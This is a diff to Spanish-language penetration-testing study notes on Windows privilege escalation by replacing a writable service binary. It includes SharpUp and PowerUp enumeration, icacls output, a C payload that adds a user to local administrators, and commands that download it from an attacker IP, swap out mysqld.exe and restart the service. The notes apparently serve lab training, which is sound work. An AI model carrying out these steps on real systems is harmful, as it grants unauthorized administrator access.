@@ -322,7 +322,10 @@ The operation completed successfully.
 ## Abusar de servicios con permisos debiles mediante su binary path
 - Muchas veces los servicios corren con permisos debiles y podemos abusar de esto cambiando el path de su binario.
 - Para enumearar podemos utilizar SharpUp.
-- `PS C:\htb> .\SharpUp.exe audit`
+    - `PS C:\htb> .\SharpUp.exe audit`
+- También podemos enumerar esto con PowerUp de PowerShell.
+    - `Import-Module .\PowerUp.ps1`
+    - `Get-ModifiableServiceFile`
 ### Reemplazando el binario de un servicio
 
 ```
@@ -340,6 +343,61 @@ C:\htb> sc start SecurityService
 - `get-process`: Enumera los procesos que se estan ejecutando.
     - `get-process -Id <pid>`: Enumera el proceso con el id especificado.
 - `get-service`: Enumera los servicios que se estan ejecutando.
+- `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`: Enumera los servicios que se estan ejecutando.
+- `icacls C:\Windows\System32\spoolsv.exe`: Enumera los permisos del archivo spoolsv.exe.
+
+### La utilidad icacls para ver permisos
+
+| Máscara | Permisos                  |
+|---------|---------------------------|
+| F       | Acceso completo           |
+| M       | Acceso de modificación    |
+| RX      | Acceso de lectura y ejecución |
+| R       | Acceso de solo lectura    |
+| W       | Acceso de solo escritura  |
+
+```powershell
+PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
+C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Administrators:(F)
+                              BUILTIN\Users:(F)
+
+Successfully processed 1 files; Failed processing 0 files
+``` 
+
+- Lo que podemos hacer es cambiar el path de la binary a un archivo que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell.
+
+```C
+
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user USER PASSWORD /add");
+  i = system ("net localgroup administrators USER /add");
+  
+  return 0;
+}
+```
+
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+``` 
+
+- Movemos el binario mysql original, subimos el nuestro y cambiamos el path del servicio.
+- `iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe`: Descargamos el binario.
+- `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`: Movemos el binario original.
+- `move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`: Movemos el binario que queremos ejecutar.
+
+- Ahora o reiniciamos el servicio o reiniciamos la maquina.
+- `sc stop mysql`: Reiniciamos el servicio.
+- `sc start mysql`: Reiniciamos el servicio.
+- O bien reiniciamos la maquina: `shutdown /r /t 0`
+
+-----
+
 
 ## DLL injection
 - La idea es metemr un trozo de código dentro de un DLL que se carga en un proceso activo.
